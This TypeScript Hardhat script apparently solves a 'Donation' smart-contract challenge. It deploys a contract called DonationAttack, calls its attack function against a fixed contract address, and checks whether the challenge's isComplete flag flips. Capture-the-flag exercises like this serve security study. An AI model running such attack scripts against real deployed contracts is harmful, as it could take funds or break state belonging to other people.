import { ethers } from "hardhat";

const contractAddress = "0x0fd8C18e68457Bd70c8f33c50068BCE5D905f125";

const abi = [
  "function donate(uint256 etherAmount) external payable",
  "function isComplete() external view returns (bool)",
];

const checkIsComplete = async () => {
  const provider = ethers.provider;
  const contract = new ethers.Contract(contractAddress, abi, provider);
  return await contract.isComplete();
};

const attack = async () => {
  const ContractFactory = await ethers.getContractFactory("DonationAttack");
  const contract = await ContractFactory.deploy();

  await contract.deployed();

  const valueToSend = await contract.getValueToSend();

  return await contract.attack(contractAddress, { value: valueToSend });
};

async function main() {
  const isCompleteStart = await checkIsComplete();
  console.log(`isCompleteStart: ${isCompleteStart}`);

  const tx = await attack();
  await tx.wait();

  const isCompleteEnd = await checkIsComplete();
  console.log(`isCompleteEnd: ${isCompleteEnd}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
